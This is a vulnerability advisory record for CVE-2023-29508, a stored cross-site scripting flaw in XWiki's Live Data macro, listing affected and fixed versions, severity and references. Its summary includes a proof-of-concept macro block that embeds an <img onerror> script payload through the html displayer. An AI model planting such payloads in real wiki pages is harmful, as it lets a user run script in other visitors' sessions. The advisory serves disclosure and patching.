advisory_id: maven/org.xwiki.platform/xwiki-platform-livedata-macro/CVE-2023-29508
datasource_id: gitlab_importer_v2/maven/org.xwiki.platform/xwiki-platform-livedata-macro/CVE-2023-29508
datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/maven/org.xwiki.platform/xwiki-platform-livedata-macro/CVE-2023-29508.yml
aliases:
  - CVE-2023-29508
  - GHSA-hmm7-6ph9-8jf2
summary: |
  org.xwiki.platform:xwiki-platform-livedata-macro vulnerable to Basic Cross-site Scripting
  A user without script rights can introduce a stored XSS by using the Live Data macro, if the last author of the content of the page has script rights.

  For instance, by adding the LiveData below in the about section of the profile of a user created by an admin.

  ```javascript
  {{liveData id="movies" properties="title,description"}}
  {
  "data": {
  "count": 1,
  "entries": [
  {
  "title": "Meet John Doe",
  "url": "https://www.imdb.com/title/tt0033891/",
  "description": "<img onerror='alert(1)' src='foo' />"
  }
  ]
  },
  "meta": {
  "propertyDescriptors": [
  {
  "id": "title",
  "name": "Title",
  "visible": true,
  "displayer": {"id": "link", "propertyHref": "url"}
  },
  {
  "id": "description",
  "name": "Description",
  "visible": true,
  "displayer": "html"
  }
  ]
  }
  }
  {{/liveData}}
  ```
impacted_packages:
  - purl: pkg:maven/org.xwiki.platform/xwiki-platform-livedata-macro
    affected_versions: vers:maven/>=13.10.10|<13.10.11|>=14.4|<14.4.7|>=14.9|<14.10
    fixed_versions: vers:maven/13.10.11|14.4.7|14.10
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score:
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/maven/org.xwiki.platform/xwiki-platform-livedata-macro/CVE-2023-29508.yml
weaknesses:
  - CWE-80
  - CWE-1035
  - CWE-937
  - CWE-79
references:
  - url: https://github.com/xwiki/xwiki-platform
    reference_type:
    reference_id:
  - url: https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-hmm7-6ph9-8jf2
    reference_type:
    reference_id:
  - url: https://jira.xwiki.org/browse/XWIKI-20312
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2023-29508
    reference_type:
    reference_id: CVE-2023-29508
  - url: https://github.com/advisories/GHSA-hmm7-6ph9-8jf2
    reference_type:
    reference_id: GHSA-hmm7-6ph9-8jf2
